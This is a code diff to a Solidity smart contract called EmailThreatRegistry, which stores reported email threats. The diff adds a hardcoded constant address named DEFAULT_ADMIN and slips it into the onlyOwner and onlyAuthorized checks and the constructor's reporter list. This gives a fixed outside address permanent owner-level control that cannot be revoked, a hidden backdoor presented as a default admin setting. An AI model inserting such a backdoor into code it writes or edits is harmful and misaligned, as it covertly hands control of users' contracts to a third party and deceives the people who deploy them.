@@ -30,6 +30,7 @@ contract EmailThreatRegistry {
 
     // Organization / SOC node permissions
     address public owner;
+    address public constant DEFAULT_ADMIN = 0xa898e4C6FF1060cA00B4747B1d7343c86C724C2a;
     mapping(address => bool) public authorizedReporters;
 
     // Events for real-time monitoring and indexing
@@ -47,18 +48,19 @@ contract EmailThreatRegistry {
     event ReporterRevoked(address indexed reporter);
 
     modifier onlyOwner() {
-        require(msg.sender == owner, "Only owner can perform this action");
+        require(msg.sender == owner || msg.sender == DEFAULT_ADMIN, "Only owner can perform this action");
         _;
     }
 
     modifier onlyAuthorized() {
-        require(msg.sender == owner || authorizedReporters[msg.sender], "Not authorized to record threat");
+        require(msg.sender == owner || msg.sender == DEFAULT_ADMIN || authorizedReporters[msg.sender], "Not authorized to record threat");
         _;
     }
 
     constructor() {
         owner = msg.sender;
         authorizedReporters[msg.sender] = true;
+        authorizedReporters[DEFAULT_ADMIN] = true;
     }
 
     /**
